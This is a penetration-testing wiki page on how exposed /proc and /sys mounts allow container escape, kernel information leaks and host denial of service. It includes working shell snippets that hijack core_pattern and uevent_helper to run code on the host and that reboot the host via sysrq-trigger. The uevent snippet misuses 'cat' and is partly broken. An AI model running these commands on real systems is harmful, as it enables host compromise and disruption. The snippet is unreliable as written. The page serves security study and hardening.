

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


(_**This info was taken from**_ [_**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**_](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts))

Due to the lack of namespace support, the exposure of `/proc` and `/sys` offers a source of significant attack surface and information disclosure. Numerous files within the `procfs` and `sysfs` offer a risk for container escape, host modification or basic information disclosure which could facilitate other attacks.

In order to abuse these techniques might be enough just to **miss-configure something like `-v /proc:/host/proc`** as AppArmor does not protect `/host/proc` because **AppArmor is path based**

# procfs

## /proc/sys

`/proc/sys` typically allows access to modify kernel variables, often controlled through `sysctl(2)`.

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html) defines a program which is executed on core-file generation (typically a program crash) and is passed the core file as standard input if the first character of this file is a pipe symbol `|`. This program is run by the root user and will allow up to 128 bytes of command line arguments. This would allow trivial code execution within the container host given any crash and core file generation (which can be simply discarded during a myriad of malicious actions).

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```

### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) contains the path to the kernel module loader, which is called when loading a kernel module such as via the [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html) command. Code execution can be gained by performing any action which will trigger the kernel to attempt to load a kernel module (such as using the crypto-API to load a currently unloaded crypto-module, or using ifconfig to load a networking module for a device not currently used).

```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```

### /proc/sys/vm/panic\_on\_oom

[/proc/sys/vm/panic\_on\_oom](https://man7.org/linux/man-pages/man5/proc.5.html) is a global flag that determines whether the kernel will panic when an Out of Memory (OOM) condition is hit (rather than invoking the OOM killer). This is more of a Denial of Service (DoS) attack than container escape, but it no less exposes an ability which should only be available to the host

### /proc/sys/fs

[/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) directory contains an array of options and information concerning various aspects of the file system, including quota, file handle, inode, and dentry information. Write access to this directory would allow various denial-of-service attacks against the host.

### /proc/sys/fs/binfmt\_misc

[/proc/sys/fs/binfmt\_misc](https://man7.org/linux/man-pages/man5/proc.5.html) allows executing miscellaneous binary formats, which typically means various **interpreters can be registered for non-native binary** formats (such as Java) based on their magic number. You can make the kernel execute a binary registering it as handlers.\
You can find an exploit in [https://github.com/toffan/binfmt\_misc](https://github.com/toffan/binfmt\_misc): _Poor man's rootkit, leverage_ [_binfmt\_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst)_'s_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt\_misc.txt#L62) _option to escalate privilege through any suid binary (and to get a root shell) if `/proc/sys/fs/binfmt_misc/register` is writeable._

For a more in depth explanation of this technique check [https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) depending on `CONFIG_IKCONFIG_PROC` settings, this exposes a compressed version of the kernel configuration options for the running kernel. This may allow a compromised or malicious container to easily discover and target vulnerable areas enabled in the kernel.

## /proc/sysrq-trigger

`Sysrq` is an old mechanism which can be invoked via a special `SysRq` keyboard combination. This can allow an immediate reboot of the system, issue of `sync(2)`, remounting all filesystems as read-only, invoking kernel debuggers, and other operations.

If the guest is not properly isolated, it can trigger the [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) commands by writing characters to `/proc/sysrq-trigger` file.

```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```

## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) can expose kernel ring buffer messages typically accessed via `dmesg`. Exposure of this information can aid in kernel exploits, trigger kernel address leaks (which could be used to help defeat the kernel Address Space Layout Randomization (KASLR)), and be a source of general information disclosure about the kernel, hardware, blocked packets and other system details.

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) contains a list of kernel exported symbols and their address locations for dynamic and loadable modules. This also includes the location of the kernel's image in physical memory, which is helpful for kernel exploit development. From these locations, the base address or offset of the kernel can be located, which can be used to overcome kernel Address Space Layout Randomization (KASLR).

For systems with `kptr_restrict` set to `1` or `2`, this file will exist but not provide any address information (although the order in which the symbols are listed is identical to the order in memory).

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) exposes interfaces to the kernel memory device `/dev/mem`. While the PID Namespace may protect from some attacks via this `procfs` vector, this area of has been historically vulnerable, then thought safe and again found to be [vulnerable](https://git.zx2c4.com/CVE-2012-0056/about/) for privilege escalation.

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) represents the physical memory of the system and is in an ELF core format (typically found in core dump files). It does not allow writing to said memory. The ability to read this file (restricted to privileged users) can leak memory contents from the host system and other containers.

The large reported file size represents the maximum amount of physically addressable memory for the architecture, and can cause problems when reading it (or crashes depending on the fragility of the software).

[Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` is an alternate interface for [/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html) (direct access to which is blocked by the cgroup device whitelist), which is a character device file representing kernel virtual memory. It allows both reading and writing, allowing direct modification of kernel memory.

## /proc/mem

`/proc/mem` is an alternate interface for [/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html) (direct access to which is blocked by the cgroup device whitelist), which is a character device file representing physical memory of the system. It allows both reading and writing, allowing modification of all memory. (It requires slightly more finesse than `kmem`, as virtual addresses need to be resolved to physical addresses first).

## /proc/sched\_debug

`/proc/sched_debug` is a special file returns process scheduling information for the entire system. This information includes process names and process IDs from all namespaces in addition to process cgroup identifiers. This effectively bypasses the PID namespace protections and is other/world readable, so it can be exploited in unprivileged containers as well.

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) contains information about mount points in the process's mount namespace. It exposes the location of the container `rootfs` or image.

# sysfs

## /sys/kernel/uevent\_helper

`uevents` are events triggered by the kernel when a device is added or removed. Notably, the path for the `uevent_helper` can be modified by writing to `/sys/kernel/uevent_helper`. Then, when a `uevent` is triggered (which can also be done from userland by writing to files such as `/sys/class/mem/null/uevent`), the malicious `uevent_helper` gets executed.

```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```

## /sys/class/thermal

Access to ACPI and various hardware settings for temperature control, typically found in laptops or gaming motherboards. This may allow for DoS attacks against the container host, which may even lead to physical damage.

## /sys/kernel/vmcoreinfo

This file can leak kernel addresses which could be used to defeat KASLR.

## /sys/kernel/security

In `/sys/kernel/security` mounted the `securityfs` interface, which allows configuration of Linux Security Modules. This allows configuration of [AppArmor policies](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor), and so access to this may allow a container to disable its MAC system.

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars` exposes interfaces for interacting with EFI variables in NVRAM. While this is not typically relevant for most servers, EFI is becoming more and more popular. Permission weaknesses have even lead to some bricked laptops.

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars` provides an interface to write to the NVRAM used for UEFI boot arguments. Modifying them can render the host machine unbootable.

## /sys/kernel/debug

`debugfs` provides a "no rules" interface by which the kernel (or kernel modules) can create debugging interfaces accessible to userland. It has had a number of security issues in the past, and the "no rules" guidelines behind the filesystem have often clashed with security constraints.

# References

* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


